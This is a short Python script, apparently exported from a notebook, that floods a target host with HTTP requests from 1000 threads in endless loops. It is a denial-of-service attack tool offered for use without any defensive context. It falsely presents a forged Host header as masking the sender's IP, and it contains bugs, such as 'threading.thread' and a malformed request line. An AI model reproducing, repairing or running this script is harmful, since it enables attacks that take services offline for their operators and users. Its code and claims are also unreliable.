#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import socket
import threading

class DNS(object):
    def __init__(self, target="192.168.1.1", port=80, ip_mask="182.21.30.32"):
        self.target = target
        self.port = port
        self.ip_mask = ip_mask
        
        
    def run(self):
        for i in range(1000):
            thread = threading.thread(target=self.deny).start()
            
            
    def deny(self):
        while True:
            print(f"Establishing Connection {self.target}...")
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((self.target, self.port))
            connection.sendto((f"GET /{self.target} HTTP/1.1 \r \n").encode("ascii"), (self.target, self.port))
            connection.sendto((f"Host: {self.ip_mask} \r\n\r\n ").encode("ascii"), (self.target, self.port))
            connection.close()
            
            
if __name__ == "__main__":
    DNS().run()

